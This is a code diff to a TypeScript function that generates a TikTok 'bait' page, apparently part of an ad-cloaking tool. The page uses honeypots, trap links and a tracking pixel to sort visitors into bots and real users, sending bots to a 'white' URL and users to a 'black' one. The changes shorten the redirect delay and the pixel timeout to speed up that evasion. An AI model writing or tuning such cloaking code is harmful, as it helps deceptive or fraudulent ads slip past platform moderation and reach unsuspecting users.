@@ -109,7 +109,7 @@ function sanitizeUrl(url: string): string {
 function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: string): string {
   const honeypotId = `hp_${randomBytes(4).toString('hex')}`;
   const trapLinkId = `tl_${randomBytes(4).toString('hex')}`;
-  const delay = 350 + Math.floor(Math.random() * 150); // 350-500ms with jitter
+  const delay = 100 + Math.floor(Math.random() * 50); // 100-150ms optimized for speed
   const safeWhiteUrl = sanitizeUrl(whiteUrl);
   
   // Use absolute URLs to avoid routing issues with custom domains
@@ -333,8 +333,8 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
       setTimeout(function(){
         if(botDetected)return;
         
-        // Set a hard timeout for pixel loading (2000ms max - generous for slow internet)
-        // Bots typically block immediately or timeout, real users with slow internet will load eventually
+        // Set a hard timeout for pixel loading (1000ms - balanced for speed vs slow connections)
+        // Bots typically block immediately, real users load within 500ms normally
         pixelTimeout=setTimeout(function(){
           if(!pixelLoaded&&!botDetected){
             // Pixel didn't load in time = bot blocking images
@@ -343,7 +343,7 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
             img.src=bl+'&r=pixel_timeout';
             window.location=w;
           }
-        },2000);
+        },1000);
         
         // Try to send pixel - only go to BLACK on success
         sendPixel('black',function(){
